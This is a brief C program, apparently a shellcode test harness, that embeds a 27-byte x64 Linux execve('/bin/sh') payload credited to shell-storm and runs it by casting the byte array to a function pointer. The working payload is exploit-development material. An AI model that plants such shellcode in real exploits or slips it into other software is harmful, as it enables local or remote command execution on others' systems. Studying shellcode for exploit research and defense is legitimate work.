#include<stdio.h>
#include<string.h>

int main()
{
    // example shellcode - x64 shell http://shell-storm.org/shellcode/files/shellcode-806.php
    const unsigned char shell[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    printf("[INFO] shellcode length:  %d\n", sizeof(shell));
    printf("[INFO] shellcode length as string:  %d\n", strlen(shell));

    printf("[EXEC] calling ...\n");
	int (*shell_call)() = (int(*)())shell;
	return shell_call();
}
